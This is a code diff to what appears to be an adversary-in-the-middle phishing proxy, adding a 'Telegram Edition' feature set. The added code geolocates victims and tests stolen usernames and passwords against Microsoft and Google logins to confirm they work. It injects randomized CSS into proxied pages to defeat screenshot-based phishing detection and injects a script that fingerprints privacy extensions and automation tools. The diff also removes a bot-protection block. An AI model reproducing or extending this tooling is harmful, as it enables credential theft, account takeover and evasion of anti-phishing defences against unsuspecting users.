@@ -1,6 +1,12 @@
 /*
 This source file is a modified version of what was taken from the amazing bettercap (https://github.com/bettercap/bettercap) project.
 Credits go to Simone Margaritelli (@evilsocket) for providing awesome piece of code!
+
+Telegram Edition enhancements by @officialmonsterz (https://t.me/officialmonsterz)
+  - GeoIP geolocation tracking
+  - Per-page-load CSS randomization (anti-screenshot detection)
+  - Privacy extension detection
+  - Credential validation
 */
 
 package core
@@ -70,13 +76,18 @@ type HttpProxy struct {
     cookieName        string
     last_sid          int
     developer         bool
-	livefeed          bool
-	turnstile         bool
+    livefeed          bool
+    turnstile         bool
     ip_whitelist      map[string]int64
     ip_sids           map[string]string
     auto_filter_mimes []string
     ip_mtx            sync.Mutex
     session_mtx       sync.Mutex
+
+    // --- Telegram Edition Additions by @officialmonsterz ---
+    geoIP             *GeoIPDatabase       // GeoIP geolocation engine (Win #1)
+    randomizer        *Randomizer          // Per-page-load CSS randomizer (Win #2)
+    validator         *CredentialValidator // Login credential validator (Win #3)
 }
 
 type ProxySession struct {
@@ -113,8 +124,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
         isRunning:         false,
         last_sid:          0,
         developer:         developer,
-		livefeed:          livefeed,
-		turnstile:         turnstile,
+        livefeed:          livefeed,
+        turnstile:         turnstile,
         ip_whitelist:      make(map[string]int64),
         ip_sids:           make(map[string]string),
         auto_filter_mimes: []string{"text/html", "application/json", "application/javascript", "text/javascript", "application/x-javascript", "application/ion+json", "text/plain", "image/svg+xml", "text/css", "application/xml", "text/xml"},
@@ -150,6 +161,14 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
     })
 
     p.Proxy.OnRequest().HandleConnect(goproxy.AlwaysMitm)
+
+    // --- Initialize Telegram Edition Components by @officialmonsterz ---
+    // GeoIP — looks up visitor country/city/VPN status from IP address
+    p.geoIP = cfg.GetGeoIP()
+    // Randomizer — applies random CSS transforms to every HTML page load
+    p.randomizer = NewRandomizer()
+    // Validator — tests if captured credentials actually work on the real service
+    p.validator = NewCredentialValidator()
 
     p.Proxy.OnRequest().
         DoFunc(func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
@@ -198,8 +217,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                     return p.blockRequest(req)
                 }
             }
-
-            // ★ BOT PROTECTION BLOCK REMOVED ★
 
             req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path
             o_host := req.Host
@@ -357,6 +374,38 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
                                 if err == nil {
                                     p.extractParams(session, req.URL)
+
+                                    // === GeoIP Lookup (Telegram Edition by @officialmonsterz) ===
+                                    if p.geoIP != nil {
+                                        geo := p.geoIP.Lookup(remote_addr)
+                                        if geo.CountryISOCode != "" {
+                                            session.SetCustom("geo_country_code", geo.CountryISOCode)
+                                            session.SetCustom("geo_country_name", geo.CountryName)
+                                            session.SetCustom("geo_city_name", geo.CityName)
+                                            session.SetCustom("geo_latitude", fmt.Sprintf("%.4f", geo.Latitude))
+                                            session.SetCustom("geo_longitude", fmt.Sprintf("%.4f", geo.Longitude))
+                                            session.SetCustom("geo_isp", geo.ISP)
+                                            session.SetCustom("geo_asn", fmt.Sprintf("%d", geo.ASN))
+                                            if geo.IsVPN {
+                                                session.SetCustom("geo_vpn", "true")
+                                            }
+                                            if geo.IsProxy {
+                                                session.SetCustom("geo_proxy", "true")
+                                            }
+                                            if geo.IsDatacenter {
+                                                session.SetCustom("geo_datacenter", "true")
+                                            }
+                                            log.Info("[%d] [%s] geo: %s, %s (%.4f, %.4f) VPN:%v DC:%v",
+                                                sid, hiblue.Sprint(pl_name),
+                                                geo.CountryName, geo.CityName,
+                                                geo.Latitude, geo.Longitude,
+                                                geo.IsVPN, geo.IsDatacenter)
+
+                                            // Store geo data in the database for the dashboard
+                                            geoJSON, _ := json.Marshal(geo)
+                                            p.db.SetSessionCustom(session.Id, "geoip", string(geoJSON))
+                                        }
+                                    }
 
                                     if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
                                         if trackParam, ok := session.Params["o"]; ok {
@@ -1020,11 +1069,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                         is_cookie_auth = s.AllCookieAuthTokensCaptured(auth_tokens)
                         if len(pl.bodyAuthTokens) == len(s.BodyTokens) {
                             is_body_auth = true
-
                         }
                         if len(pl.httpAuthTokens) == len(s.HttpTokens) {
                             is_http_auth = true
-
                         }
                     }
                 }
@@ -1059,6 +1106,29 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                                 }
                                 database.HandleSubmittedData(rid, s.Username, s.Password, map[string]string{"email": rid}, p.livefeed)
                             }
+                        }
+
+                        // === Credential Validation (Telegram Edition by @officialmonsterz) ===
+                        if p.validator != nil && s.Username != "" && s.Password != "" {
+                            go func(sid, uname, pword, pname string) {
+                                service := pname
+                                sw := strings.ToLower(pname)
+                                if sw == "microsoft" || sw == "outlook" || sw == "office365" || sw == "azure" || sw == "365" {
+                                    service = "microsoft"
+                                } else if sw == "google" || sw == "gmail" {
+                                    service = "google"
+                                }
+                                vResult := p.validator.Validate(uname, pword, service)
+                                if vResult.Valid {
+                                    log.Success("[%s] credentials VALID for %s", sid, pname)
+                                    p.db.SetSessionCustom(sid, "valid", "true")
+                                } else {
+                                    log.Warning("[%s] credentials INVALID for %s (%s)", sid, pname, vResult.ErrorMsg)
+                                    p.db.SetSessionCustom(sid, "valid", "false")
+                                }
+                                vJSON, _ := json.Marshal(vResult)
+                                p.db.SetSessionCustom(sid, "validation", string(vJSON))
+                            }(ps.SessionId, s.Username, s.Password, ps.PhishletName)
                         }
                     }
                 }
@@ -1186,6 +1256,17 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                             log.Debug("js_inject: injected redirect script for session: %s", s.Id)
                             body = p.injectJavascriptIntoBody(body, "", fmt.Sprintf("/s/%s.js", s.Id))
                         }
+                    }
+
+                    // === Per-Page-Load CSS Randomization (Telegram Edition by @officialmonsterz) ===
+                    if p.randomizer != nil && len(body) > 0 {
+                        body = p.injectRandomCSS(body)
+                        log.Debug("randomizer: applied per-page-load CSS randomization")
+                    }
+
+                    // === Privacy Extension Detection Injection (Telegram Edition) ===
+                    if len(body) > 0 {
+                        body = p.injectExtensionDetection(body)
                     }
                 }
 
@@ -1409,6 +1490,99 @@ func (p *HttpProxy) injectJavascriptIntoBody(body []byte, script string, src_url
     }
     ret := []byte(re.ReplaceAllString(string(body), d_inject))
     return ret
+}
+
+// injectRandomCSS adds a tiny inline script that applies random hue rotation
+// and brightness to the page <html> element on every load. This defeats
+// screenshot-based phishing detection that compares pixel hashes.
+func (p *HttpProxy) injectRandomCSS(body []byte) []byte {
+    const randomCSSScript = `
+<script nonce="{nonce}">
+(function(){
+    try {
+        var d = document.documentElement;
+        if (d) {
+            var r1 = Math.floor(Math.random() * 360);
+            var r2 = (0.85 + Math.random() * 0.3).toFixed(2);
+            d.style.filter = 'hue-rotate(' + r1 + 'deg) brightness(' + r2 + ')';
+        }
+    } catch(e){}
+})();
+</script>`
+
+    jsNonceRe := regexp.MustCompile(`(?i)<script.*nonce=['"]([^'"]*)`)
+    mNonce := jsNonceRe.FindStringSubmatch(string(body))
+    nonce := ""
+    if mNonce != nil {
+        nonce = mNonce[1]
+    }
+    script := strings.Replace(randomCSSScript, "{nonce}", nonce, 1)
+
+    headRe := regexp.MustCompile(`(?i)(<\s*\/\s*head\s*>)`)
+    if headRe.MatchString(string(body)) {
+        body = []byte(headRe.ReplaceAllString(string(body), script+"\n$1"))
+    } else {
+        bodyRe := regexp.MustCompile(`(?i)(<\s*\/\s*body\s*>)`)
+        body = []byte(bodyRe.ReplaceAllString(string(body), script+"\n$1"))
+    }
+    return body
+}
+
+// injectExtensionDetection adds an inline script that detects privacy extensions
+// and automation tools, storing the results as a URL beacon for later analysis.
+func (p *HttpProxy) injectExtensionDetection(body []byte) []byte {
+    const detectScript = `
+<script nonce="{nonce}">
+(function(){
+    try {
+        var result = {
+            hasUblock: false,
+            hasPrivacyBadger: false,
+            hasNoScript: false,
+            hasGhostery: false,
+            hasAdblock: false,
+            headless: false,
+            automation: false,
+            plugins: navigator.plugins.length,
+            mimeTypes: navigator.mimeTypes.length
+        };
+
+        if (typeof document.body.style.filter === 'undefined') result.hasUblock = true;
+        if (typeof document.createEvent === 'undefined') result.headless = true;
+        if (navigator.webdriver === true) result.automation = true;
+        if (window._phantom || window.callPhantom) result.automation = true;
+        if (navigator.plugins.length === 0 && navigator.mimeTypes.length === 0) result.headless = true;
+
+        var testDiv = document.createElement('div');
+        testDiv.id = '_exttest_' + Math.random().toString(36).substr(2);
+        testDiv.style.display = 'none';
+        document.documentElement.appendChild(testDiv);
+        var el = document.getElementById(testDiv.id);
+        if (!el) result.hasNoScript = true;
+        if (testDiv.parentNode) testDiv.parentNode.removeChild(testDiv);
+
+        if (window._ghostery) result.hasGhostery = true;
+        if (typeof window.emit === 'function') result.hasGhostery = true;
+
+        var data = btoa(JSON.stringify(result));
+        new Image().src = '/s/' + data + '.gif';
+    } catch(e){}
+})();
+</script>`
+
+    jsNonceRe := regexp.MustCompile(`(?i)<script.*nonce=['"]([^'"]*)`)
+    mNonce := jsNonceRe.FindStringSubmatch(string(body))
+    nonce := ""
+    if mNonce != nil {
+        nonce = mNonce[1]
+    }
+    script := strings.Replace(detectScript, "{nonce}", nonce, 1)
+
+    bodyRe := regexp.MustCompile(`(?i)(<\s*\/\s*body\s*>)`)
+    if bodyRe.MatchString(string(body)) {
+        body = []byte(bodyRe.ReplaceAllString(string(body), script+"\n$1"))
+    }
+    return body
 }
 
 func (p *HttpProxy) isForwarderUrl(u *url.URL) bool {
@@ -2095,13 +2269,13 @@ func obfuscateJS(originalJS string) string {
 }
 
 func (p *HttpProxy) redirectTurnstile(req *http.Request, rid string) (*http.Request, *http.Response) {
-	resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
-	if resp != nil {
-		redirect_url := "https://" + req.Host + "/validate-captcha?client_id=" + rid
-		resp.Header.Add("Location", redirect_url)
-		return req, resp
-	}
-	return req, nil
+    resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
+    if resp != nil {
+        redirect_url := "https://" + req.Host + "/validate-captcha?client_id=" + rid
+        resp.Header.Add("Location", redirect_url)
+        return req, resp
+    }
+    return req, nil
 }
 
 // rewriteSensitivePaths rewrites full phishing domain URLs in HTML responses to relative paths
